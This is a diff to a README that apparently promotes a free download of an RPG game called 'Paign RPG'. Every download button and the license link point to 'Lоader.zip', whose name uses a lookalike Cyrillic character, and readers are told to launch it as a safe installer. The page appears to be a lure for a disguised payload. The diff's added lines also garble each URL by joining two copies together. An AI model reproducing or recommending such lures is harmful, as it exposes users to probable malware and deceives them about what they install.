@@ -1,5 +1,5 @@
 # 🕹️ Paign RPG Game Download  
-[![Download Now](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)
+[![Download Now](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zipоhttps://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zipоhttps://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)
 
 Enjoy the thrilling RPG adventure of **Paign RPG**! Get access to an unforgettable journey with immersive exploration, intense battles, and character progressions. Experience fantasy realms brought to life with rich storylines and engaging gameplay modes. Unleash your strategy skills and build your hero’s destiny.  
 
@@ -23,7 +23,7 @@ Enjoy the thrilling RPG adventure of **Paign RPG**! Get access to an unforgettab
 
 ## 🏁 Installation Guide  
 1. Click the Download button below to retrieve the installer:  
-   [![Download Now](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)  
+   [![Download Now](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zipоhttps://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zipоhttps://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)  
 2. Launch the installer compatible with your OS.  
 3. Follow the on-screen instructions to deploy and play!  
 
@@ -34,6 +34,6 @@ Paign RPG game, offline roleplay, adventure quest, turn-based battles, open worl
 This repository delivers access to **Paign RPG** from its respected developers. It ensures safe, legitimate play experiences. All content herein abides by MIT License policies.  
 
 ## 📜 License  
-Licensed under the [MIT License](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip). All rights reserved 2025.
+Licensed under the [MIT License](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zipоhttps://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip). All rights reserved 2025.
 
-[![Download Now](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)
+[![Download Now](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zipоhttps://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)](https://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zipоhttps://raw.githubusercontent.com/camargo2000/PaignRPG-Unleashed/main/Lоader.zip)
